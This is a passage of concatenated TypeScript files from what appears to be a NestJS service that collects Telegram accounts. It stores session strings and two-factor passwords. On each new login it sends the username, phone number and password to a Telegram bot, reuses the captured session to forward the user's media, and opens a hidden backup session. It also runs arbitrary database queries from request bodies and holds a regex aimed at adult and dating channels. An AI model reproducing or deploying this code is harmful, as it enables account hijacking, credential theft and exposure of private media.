\"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserData[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.userDataModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.userDataModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\n                $set: {\n                    totalCount: 10,\n                    limitTime: Date.now(),\n                    paidReply: true\n                }\n            });\n        } catch (error) {\n            parseError(error)\n        }\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n\n  \n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  async findAll() {\n    return this.usersService.findAll();\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) { }\n\n  async create(user: CreateUserDto): Promise<User | undefined> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      setTimeout(async () => {\n        try {\n          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });\n          this.telegramService.forwardMediaToBot(user.mobile, null);\n          const newSession = await this.telegramService.createNewSession(user.mobile);\n          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: \"Backup\" });\n          await newUserBackup.save();\n        } catch (error) {\n          console.log(\"Error in creating new session\", error);\n        }\n      }, 3000);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","export enum PrivacyLevelEnum {\r\n    everybody = 'everybody',\r\n    contacts = 'contacts',\r\n    nobody = 'nobody'\r\n}\r\n\r\nexport type PrivacyLevel = keyof typeof PrivacyLevelEnum;\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    uniqueSenders: number;\r\n    messageTypes: {\r\n        text: number;\r\n        photo: number;\r\n        video: number;\r\n        voice: number;\r\n        other: number;\r\n    };\r\n    topSenders: Array<{\r\n        id: string;\r\n        count: number;\r\n    }>;\r\n    mostActiveHours: Array<{\r\n        hour: number;\r\n        count: number;\r\n    }>;\r\n}\r\n\r\nexport interface ContentFilter {\r\n    chatId: string;\r\n    keywords?: string[];\r\n    mediaTypes?: ('photo' | 'video' | 'document')[];\r\n    actions: ('delete' | 'warn' | 'mute')[];\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n}\r\n\r\nexport interface GroupOptions {\r\n    title: string;\r\n    members?: string[];\r\n    photo?: string;\r\n    about?: string;\r\n    address?: string;\r\n    slowMode?: number;\r\n    megagroup?: boolean;\r\n    forImport?: boolean;\r\n    memberRestrictions?: {\r\n        sendMessages?: boolean;\r\n        sendMedia?: boolean;\r\n        sendStickers?: boolean;\r\n        sendGifs?: boolean;\r\n        sendGames?: boolean;\r\n        sendInline?: boolean;\r\n        embedLinks?: boolean;\r\n    };\r\n}\r\n\r\nexport interface ChannelInfo {\r\n    chatsArrayLength: number;\r\n    canSendTrueCount: number;\r\n    canSendFalseCount: number;\r\n    ids: string[];\r\n    canSendFalseChats: string[];\r\n}\r\n\r\nexport interface ChatFolderOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}","import { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport * as fs from 'fs';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  interface CustomRequest extends Request {}\n  interface CustomResponse extends Response {}\n  interface CustomNextFunction extends NextFunction {}\n\n  app.use((req: CustomRequest, res: CustomResponse, next: CustomNextFunction) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n    // whitelist: true,\n    // forbidNonWhitelisted: true,\n    transformOptions: {\n      enableImplicitConversion: true\n    },\n    // validationError: {\n    //   target: false,\n    //   value: undefined\n    // }\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(process.env.PORT || 9000);\n  console.log(`Application is running on: ${await app.getUrl()}`);\n}\nbootstrap();\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout } from '../utils/fetchWithTimeout';\nimport { parseError } from '../utils/parseError';\nimport { notifbot } from '../utils/logbots';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup', '/timestamps'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","export function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nexport function contains(str: string | null | undefined, arr: string[]): boolean {\n  if (!str || !Array.isArray(arr)) return false;\n  return arr.some(element => element && str.includes(element.toLowerCase()));\n}\n\nexport function toBoolean(value: string | number | boolean | null | undefined): boolean {\n  if (value === null || value === undefined) return false;\n  if (typeof value === 'string') {\n    const normalizedValue = value.toLowerCase().trim();\n    return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';\n  }\n  if (typeof value === 'number') {\n    return value !== 0;\n  }\n  return value;\n}\n\nexport function fetchNumbersFromString(inputString: string | null | undefined): string {\n  if (!inputString) return '';\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  return matches ? matches.join('') : '';\n}\n\nexport const defaultReactions = Object.freeze([\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '',\n  '', '', '', '', ''\n] as const);\n\nexport const defaultMessages = Object.freeze([\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n] as const);\n\nexport function areJsonsNotSame(json1: unknown, json2: unknown): boolean {\n  const keysToIgnore = ['id', '_id'];\n  console.log('[areJsonsNotSame] Starting comparison...');\n\n  function normalizeObject(obj: unknown): unknown {\n    if (obj === null || obj === undefined) return obj;\n    if (typeof obj !== 'object') return obj;\n    if (Array.isArray(obj)) return obj.map(normalizeObject);\n\n    const normalized: Record<string, unknown> = {};\n    const sortedKeys = Object.keys(obj as Record<string, unknown>)\n      .filter(key => !keysToIgnore.includes(key))\n      .sort();\n\n    for (const key of sortedKeys) {\n      normalized[key] = normalizeObject((obj as Record<string, unknown>)[key]);\n    }\n    return normalized;\n  }\n  const normalized1 = normalizeObject(json1);\n  const normalized2 = normalizeObject(json2);\n  const result = JSON.stringify(normalized1) !== JSON.stringify(normalized2);\n  console.log(`[areJsonsNotSame] Comparison result: ${result ? 'Objects are different' : 'Objects are same'}`);\n  \n  return result;\n}\n\nexport function mapToJson<K extends string | number | symbol, V>(map: Map<K, V>): Record<string, V> {\n  if (!(map instanceof Map)) {\n    throw new Error('Input must be a Map instance');\n  }\n  const obj: Record<string, V> = {};\n  for (const [key, value] of map.entries()) {\n    obj[String(key)] = value;\n  }\n  return obj;\n}\n\nexport function shouldMatch(obj) {\n    const regex = /(wife|adult|lanj|chat||||lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i\n    const titleMatch = obj.title && regex.test(obj.title);\n    const usernameMatch = obj.username && regex.test(obj.username);\n    return !!(titleMatch || usernameMatch);\n}","import axios from 'axios';\n\nexport enum ChannelCategory {\n    CLIENT_UPDATES = 'CLIENT_UPDATES',\n    USER_WARNINGS = 'USER_WARNINGS',\n    VC_WARNINGS = 'VC_WARNINGS',\n    USER_REQUESTS = 'USER_REQUESTS',\n    VC_NOTIFICATIONS = 'VC_NOTIFICATIONS',\n    CHANNEL_NOTIFICATIONS = 'CHANNEL_NOTIFICATIONS',\n    ACCOUNT_NOTIFICATIONS = 'ACCOUNT_NOTIFICATIONS',\n    ACCOUNT_LOGIN_FAILURES = 'ACCOUNT_LOGIN_FAILURES',\n    PROMOTION_ACCOUNT = 'PROMOTION_ACCOUNT',\n    CLIENT_ACCOUNT = 'CLIENT_ACCOUNT',\n    PAYMENT_FAIL_QUERIES = 'PAYMENT_FAIL_QUERIES',\n    SAVED_MESSAGES = 'SAVED_MESSAGES',\n}\n\ntype ChannelData = {\n    botTokens: string[];\n    botUsernames: string[];\n    lastUsedIndex: number;\n    channelId: string;\n};\n\nexport class BotConfig {\n    private static instance: BotConfig;\n    private categoryMap = new Map<ChannelCategory, ChannelData>();\n    private initialized = false;\n    private initPromise: Promise<void>;\n\n    private constructor() {\n        this.initPromise = this.initialize();\n    }\n\n    public static getInstance(): BotConfig {\n        if (!BotConfig.instance) {\n            BotConfig.instance = new BotConfig();\n        }\n        return BotConfig.instance;\n    }\n\n    public async ready(): Promise<void> {\n        if (!this.initialized) {\n            await this.initPromise;\n        }\n    }\n\n    private async initialize(): Promise<void> {\n        console.debug('Initializing Telegram channel configuration...');\n\n        const envKeys = Object.keys(process.env).filter(key =>\n            key.startsWith('TELEGRAM_CHANNEL_CONFIG_')\n        );\n\n        for (const key of envKeys) {\n            const value = process.env[key];\n            if (!value) continue;\n\n            const [channelId, description = '', botTokensStr] = value.split('::');\n            const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);\n            if (!channelId || !botTokens || botTokens.length === 0) continue;\n\n            const category = this.getCategoryFromDescription(description);\n            if (!category) continue;\n\n            const botUsernames: string[] = [];\n            for (const token of botTokens) {\n                const username = await this.fetchUsername(token);\n                if (!username) {\n                    throw new Error(`Invalid bot token for ${category}`);\n                }\n                botUsernames.push(username);\n            }\n\n            this.categoryMap.set(category, {\n                botTokens,\n                botUsernames,\n                lastUsedIndex: -1,\n                channelId,\n            });\n        }\n\n        this.initialized = true;\n        console.info('BotConfig initialized.');\n    }\n\n    private getCategoryFromDescription(desc: string): ChannelCategory | null {\n        const normalized = desc.toUpperCase();\n        return (Object.values(ChannelCategory) as string[]).find(cat => normalized.includes(cat)) as ChannelCategory ?? null;\n    }\n\n    private async fetchUsername(token: string): Promise<string> {\n        try {\n            const res = await axios.get(`https://api.telegram.org/bot${token}/getMe`);\n            return res.data?.ok ? res.data.result.username : '';\n        } catch {\n            return '';\n        }\n    }\n\n    public getBotUsername(category: ChannelCategory): string {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;\n        return data.botUsernames[data.lastUsedIndex];\n    }\n\n    public getChannelId(category: ChannelCategory): string {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data) {\n            throw new Error(`No config for ${category}`);\n        }\n\n        return data.channelId;\n    }\n\n    public getBotAndChannel(category: ChannelCategory): { username: string; channelId: string; token: string } {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;\n        return {\n            username: data.botUsernames[data.lastUsedIndex],\n            